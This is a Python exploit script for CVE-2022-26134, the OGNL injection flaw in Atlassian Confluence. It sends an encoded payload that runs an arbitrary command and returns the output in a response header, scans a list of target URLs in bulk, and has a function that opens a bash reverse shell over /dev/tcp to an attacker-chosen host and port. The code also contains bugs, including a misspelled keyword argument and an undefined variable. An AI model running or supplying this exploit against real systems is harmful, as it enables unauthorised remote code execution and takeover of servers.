import requests
import argparse
import urllib3
import urllib

urllib3.disable_warnings()

def payload(url,command):   
    payload = "%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D".format(command)
    response = requests.get("{}/{}/".format(url, payload), verify=False, allocw_redirects=False)
    print(url)
    try:
      if response.status_code == 302:
          result = response.headers["X-Cmd-Response"]
          print(f"\033[0;31;22m[+]\033[0m"+result)
      else:
          print("[-]This target does not seem to be vulnerable.")
    except:
      print("[-]This target does not seem to be vulnerable.")
    print("-------------------------------------")

def shell(url,ip,port):
        shell = ip + "/" + port
        shell1 = "'bash','-c','bash -i >& "
        exp = shell1 + "/dev/tcp/"  + shell + " 0>&1'"
        payload1 = '''${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('''
        payload2 = exp + ''').start()")}/'''
        payloads = payload1 + payload2
        payloads_urlencode = urllib.parse.quote(payloads)
        response = requests.get(url+payloads_urlencode)
        if response.status_code == 200 or e.status_code == 302:
        	print(f"\033[0;31;22m [+]exploit success\033[0m")
        else:
            print("[-] exploit failed")

def scan(file,cmd):
    for url_link in open(file, 'r', encoding='utf-8'):
            if url_link.strip() != '':
                url = url_link.strip()
                payload(url,cmd)

def main():
    parser = argparse.ArgumentParser(description='cve-2022-26134')
    parser.add_argument('-u', '--url', type=str, help='Target URL')
    parser.add_argument('-c', '--command', help='command')
    parser.add_argument('-i', '--lhost', help='attack host ')
    parser.add_argument('-p', '--lport', help='attack host port')
    parser.add_argument('-f', '--file', type=str, help='File path')
    args = parser.parse_args()

    url = args.url
    cmd = args.command
    host = args.lhost
    port = args.lport
    filepath = args.file

    if url is not None and filepath is None and host is None:
        payload(url,cmd)
    elif url is None and filepath is not None and host is None:
        scan(filepath,cmd)
    elif url is not None and filepath is None and host is not None:
    	shell(url,host,port)

if __name__ == '__main__':
    main()
